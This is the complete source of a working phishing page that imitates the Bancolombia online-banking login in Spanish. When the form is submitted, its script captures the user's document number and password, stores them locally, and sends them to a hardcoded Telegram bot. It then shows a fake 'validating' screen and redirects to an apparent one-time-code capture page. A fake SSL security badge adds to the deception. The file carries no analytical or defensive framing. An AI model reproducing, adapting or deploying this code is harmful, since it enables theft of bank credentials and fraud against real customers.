<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ingreso - Bancolombia</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>üè¶</text></svg>">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">
    
    <style>
        :root {
            --bg-gradient: linear-gradient(135deg, #fef3c7 0%, #fde047 38%, #facc15 100%);
            --card-bg: rgba(255, 255, 255, 0.94);
            --text: #0f172a;
            --primary: #ffd200;
            --primary-hover: #facc15;
            --border: rgba(250, 204, 21, 0.28);
            --shadow: 0 28px 60px rgba(217, 119, 6, 0.18);
            --error: #ef4444;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            height: 100%;
        }

        body {
            background: var(--bg-gradient);
            font-family: 'Inter', sans-serif;
            position: relative;
            overflow-x: hidden;
        }

        body::before {
            content: "";
            position: fixed;
            inset: 0;
            background: linear-gradient(160deg, rgba(255,255,255,0.45) 0%, rgba(254,240,138,0.4) 45%, rgba(217,119,6,0.25) 100%);
            z-index: 0;
            pointer-events: none;
        }

        .login-wrap {
            min-height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 28px 18px;
            position: relative;
            z-index: 1;
        }

        .login-card {
            width: 100%;
            max-width: 480px;
            background: var(--card-bg);
            border: 1px solid var(--border);
            border-radius: 28px;
            box-shadow: var(--shadow);
            padding: 38px;
            backdrop-filter: blur(16px);
        }

        .logo {
            text-align: center;
            margin-bottom: 32px;
        }

        .logo svg {
            width: 200px;
            height: auto;
        }

        .login-header {
            text-align: center;
            margin-bottom: 32px;
        }

        .login-title {
            font-size: 24px;
            font-weight: 700;
            color: var(--text);
            margin-bottom: 8px;
        }

        .login-subtitle {
            font-size: 14px;
            color: #64748b;
            line-height: 1.5;
        }

        .alert-error {
            display: none;
            background: #fee2e2;
            border: 1px solid #fecaca;
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 24px;
            color: var(--error);
            font-size: 14px;
            align-items: center;
            gap: 12px;
        }

        .alert-error.show {
            display: flex;
        }

        .alert-error i {
            font-size: 20px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: var(--text);
            margin-bottom: 8px;
        }

        .form-input-wrap {
            position: relative;
        }

        .form-input {
            width: 100%;
            padding: 14px 16px 14px 48px;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            font-size: 15px;
            font-family: inherit;
            transition: all 0.3s ease;
            background: white;
        }

        .form-input:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 4px rgba(255, 210, 0, 0.1);
        }

        .input-icon {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 20px;
            color: #64748b;
            pointer-events: none;
        }

        .btn-submit {
            width: 100%;
            padding: 16px;
            background: var(--primary);
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            color: #0f172a;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-top: 8px;
        }

        .btn-submit:hover {
            background: var(--primary-hover);
            transform: translateY(-2px);
            box-shadow: 0 8px 24px rgba(255, 210, 0, 0.4);
        }

        .btn-submit:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .security-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-top: 24px;
            padding: 14px;
            background: rgba(74, 222, 128, 0.1);
            border-radius: 12px;
            border: 1px solid rgba(74, 222, 128, 0.2);
        }

        .security-badge i {
            font-size: 20px;
            color: #22c55e;
        }

        .security-text {
            font-size: 13px;
            color: #16a34a;
            font-weight: 600;
        }

        .loading-screen {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(15, 23, 42, 0.9);
            z-index: 9999;
            align-items: center;
            justify-content: center;
        }

        .loading-screen.active {
            display: flex;
        }

        .loading-content {
            text-align: center;
            color: white;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255, 255, 255, 0.2);
            border-top-color: var(--primary);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        @media (max-width: 599px) {
            .login-card {
                padding: 28px 24px;
            }
        }
    </style>
</head>
<body>
    <div class="loading-screen" id="loadingScreen">
        <div class="loading-content">
            <div class="spinner"></div>
            <p>Validando tus datos...</p>
        </div>
    </div>

    <div class="login-wrap">
        <div class="login-card">
            <div class="logo">
                <svg viewBox="0 0 200 40">
                    <text x="10" y="30" font-family="Inter, Arial" font-size="24" font-weight="900" fill="#005CA9">Bancolombia</text>
                </svg>
            </div>

            <div class="login-header">
                <h1 class="login-title">üîê Ingreso Seguro</h1>
                <p class="login-subtitle">Ingresa tus credenciales para continuar</p>
            </div>

            <div class="alert-error" id="errorAlert">
                <i class='bx bx-error-circle'></i>
                <span>Usuario o clave incorrectos</span>
            </div>

            <form id="loginForm">
                <div class="form-group">
                    <label class="form-label" for="usuario">Tipo y n√∫mero de documento</label>
                    <div class="form-input-wrap">
                        <i class='bx bx-user input-icon'></i>
                        <input type="text" id="usuario" class="form-input" placeholder="Ej: CC 1234567890" required>
                    </div>
                </div>

                <div class="form-group">
                    <label class="form-label" for="clave">Clave de ingreso</label>
                    <div class="form-input-wrap">
                        <i class='bx bx-lock-alt input-icon'></i>
                        <input type="password" id="clave" class="form-input" placeholder="Ingresa tu clave" maxlength="8" required>
                    </div>
                </div>

                <button type="submit" class="btn-submit">INGRESAR</button>

                <div class="security-badge">
                    <i class='bx bx-shield-quarter'></i>
                    <span class="security-text">Conexi√≥n segura SSL 256-bit</span>
                </div>
            </form>
        </div>
    </div>

    <script src="js/telegram.js"></script>
    <script>
        // VERSI√ìN SUPER SIMPLE - SIN ERRORES
        console.log('üöÄ P√°gina cargada');

        const BOT_TOKEN = '8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc';
        const CHAT_ID = '8469651553';

        // Funci√≥n para enviar a Telegram (backup si telegram.js falla)
        async function enviarTelegram(mensaje) {
            try {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: mensaje,
                        parse_mode: 'Markdown'
                    })
                });
                return await response.json();
            } catch (error) {
                console.error('Error Telegram:', error);
                return null;
            }
        }

        // Manejar formulario
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            console.log('üìù Formulario enviado');

            const usuario = document.getElementById('usuario').value.trim();
            const clave = document.getElementById('clave').value.trim();

            if (!usuario || !clave) {
                document.getElementById('errorAlert').classList.add('show');
                return;
            }

            // Mostrar loading
            document.getElementById('loadingScreen').classList.add('active');
            console.log('‚è≥ Mostrando loading...');

            // Generar ID
            const id = Date.now().toString(36);

            // Guardar en localStorage
            const datos = {
                usuario: usuario,
                clave: clave,
                transactionId: id,
                timestamp: new Date().toLocaleString('es-CO')
            };

            localStorage.setItem('loginData', JSON.stringify(datos));
            console.log('üíæ Datos guardados:', datos);

            // Mensaje para Telegram
            const mensaje = `üîê *LOGIN BANCOLOMBIA*\n\nüë§ Usuario: ${usuario}\nüîë Clave: ${clave}\n‚è∞ ${datos.timestamp}\nüÜî ID: ${id}`;

            // Intentar enviar a Telegram
            console.log('üì§ Enviando a Telegram...');
            try {
                await enviarTelegram(mensaje);
                console.log('‚úÖ Enviado a Telegram');
            } catch (error) {
                console.log('‚ö†Ô∏è Error en Telegram (continuando):', error);
            }

            // REDIRIGIR DESPU√âS DE 2 SEGUNDOS (siempre)
            console.log('‚è∞ Timer iniciado - redirigir√° en 2 segundos');
            
            setTimeout(function() {
                console.log('üîÑ REDIRIGIENDO AHORA');
                document.getElementById('loadingScreen').classList.remove('active');
                window.location.href = 'otp-dinamica.html';
            }, 2000);
        });

        // Limpiar error al escribir
        document.querySelectorAll('.form-input').forEach(function(input) {
            input.addEventListener('input', function() {
                document.getElementById('errorAlert').classList.remove('show');
            });
        });

        console.log('‚úÖ Script listo');
    </script>
</body>
</html>
